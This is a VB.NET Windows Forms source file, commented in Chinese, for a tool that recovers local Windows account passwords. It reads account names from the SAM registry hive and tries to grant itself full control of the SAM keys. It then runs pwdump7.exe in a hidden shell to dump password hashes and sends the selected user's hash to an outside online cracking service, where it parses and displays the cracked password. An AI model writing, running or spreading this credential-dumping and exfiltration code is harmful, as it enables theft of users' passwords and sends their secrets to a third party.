Imports System.IO
Imports System.Net
Imports Microsoft.Win32 '注册表控制
Imports System.Security.AccessControl '访问权限设置
Imports System.Windows.Forms
Imports MSXML2



Public Class ToolWinPasswordForm

    Dim put As String = ""
    Dim username As String = ""
    Dim remotecont As String = ""
    Dim lxmlhttp As New XMLHTTP60
    '/windows获取当前所有用户，利用pwdump，检测当前用户密码--网站
    '延迟进行下一步，node选中判断

    '窗体加载时，启动treeview，显示账户
    Private Sub t_pass_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        get_user_sys(tv_user)

    End Sub

    Private Sub bt_get_pass_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles bt_get_pass.Click
        Try

            Dim pass As String = ""
            Dim j As Integer

            j = InStr(remotecont, "Password:", CompareMethod.Text)
            pass = Mid(remotecont, j + 25, 40)

            pass = "所选账户 " + username + "的口令为:  " + pass.Split("<")(0)


            bt_showpass.Text = "let me see see" + vbCrLf + vbCrLf + pass + vbCrLf
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

    End Sub
    '刷新node，重新获取用户列表
    Private Sub win_pass_refresh_reg_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles win_pass_refresh_reg.Click

        get_user_sys(tv_user)

    End Sub
    '运行工具获取密文，提交密文破解
    Private Sub bt_load_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles bt_load.Click
        Try

            Dim tmp()
            Dim PathTool As String = Application.StartupPath.Replace("\", "/") + "/pwdump7.exe"
            Dim PathTool_cmd As String = "cmd /c " + PathTool + ">1.txt"


            cmd(PathTool_cmd)

            If File.Exists("1.txt") Then
                tmp = File.ReadAllLines("1.txt")

                For i = 0 To tmp.Length - 1
                    If tmp(i).split(":")(0) = username Then
                        put = tmp(i).split(":")(2) + ":" + tmp(i).split(":")(3)
                    End If
                Next

            End If
            lxmlhttp.open("GET", "http://www.objectif-securite.ch/products.php?hash=" + put, False)
            lxmlhttp.send()
            remotecont = lxmlhttp.responseText
        Catch ex As Exception
            MessageBox.Show(ex.Message)

        End Try

    End Sub
    '鼠标选中用户名
    Private Sub tv_user_NodeMouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.TreeNodeMouseClickEventArgs) Handles tv_user.NodeMouseClick

        e.Node.Checked = True
        username = Trim(e.Node.Text)

    End Sub
    '用户名列表通过读注册表值获取，需要获取权限控制，目前需手动授权，自动无法成功
    Public Sub get_user_sys(ByVal tv As TreeView)

        '每次调用获取用户 ，先清空当前区域值
        If tv.Nodes.Count <> 0 Then
            For i = tv.Nodes.Count - 1 To 0 Step -1
                tv.Nodes.Remove(tv.Nodes(i))
            Next
        End If

        tv.Nodes.Add("当前系统中的用户:")

        '使当前用户有权限调用sam注册表，目前不成功
        Dim regkey_sam0 As RegistryKey = Registry.LocalMachine.OpenSubKey("sam")
        Dim rule_sam0 As RegistrySecurity = regkey_sam0.GetAccessControl()
        Dim acce_sam0 As RegistryAccessRule = New RegistryAccessRule(Environment.UserName, RegistryRights.FullControl, AccessControlType.Allow)
        rule_sam0.AddAccessRule(acce_sam0)
        regkey_sam0.Close()

        '使当前用户控制sam/sam注册表，目前不成功
        Dim regkey_sam1 As RegistryKey = Registry.LocalMachine.OpenSubKey("sam\sam")
        Dim rule_sam1 As RegistrySecurity = regkey_sam1.GetAccessControl()
        Dim acce_sam1 As RegistryAccessRule = New RegistryAccessRule(Environment.UserName, RegistryRights.FullControl, AccessControlType.Allow)
        rule_sam1.AddAccessRule(acce_sam1)
        regkey_sam1.Close()

        '注册表中展开，读用户名
        Dim regkey_user As RegistryKey = Registry.LocalMachine.OpenSubKey("sam\sam\domains\account\users\names")
        For i = 0 To regkey_user.SubKeyCount - 1
            Dim new_node As New TreeNode
            new_node.Text = regkey_user.GetSubKeyNames(i).ToString
            tv.Nodes.Add(new_node.Text)
        Next i
        regkey_user.Close()

    End Sub
    '定义cmd命令执行隐藏
    Public Sub cmd(ByVal s As String)

        Shell(s, AppWinStyle.Hide)

    End Sub



End Class